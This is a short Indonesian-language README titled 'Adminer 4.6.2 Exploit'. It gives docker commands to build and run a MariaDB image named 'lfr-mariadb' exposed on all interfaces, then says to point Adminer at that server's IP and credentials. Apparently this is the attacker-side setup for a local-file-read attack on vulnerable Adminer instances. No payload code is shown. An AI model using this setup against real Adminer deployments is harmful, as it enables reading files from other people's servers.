Adminer 4.6.2 Exploit 

Buat image menggunakan docker
```bash
sudo docker build -t lfr-mariadb .
```

Jalankan imagenya 
```bash
sudo docker run -d --name lfr-mariadb -p 0.0.0.0:3306:3306 lfr-mariadb
```

pada Adminer masukkan IP dan konfigurasi sesuai dengan IP dan Credentialnya 
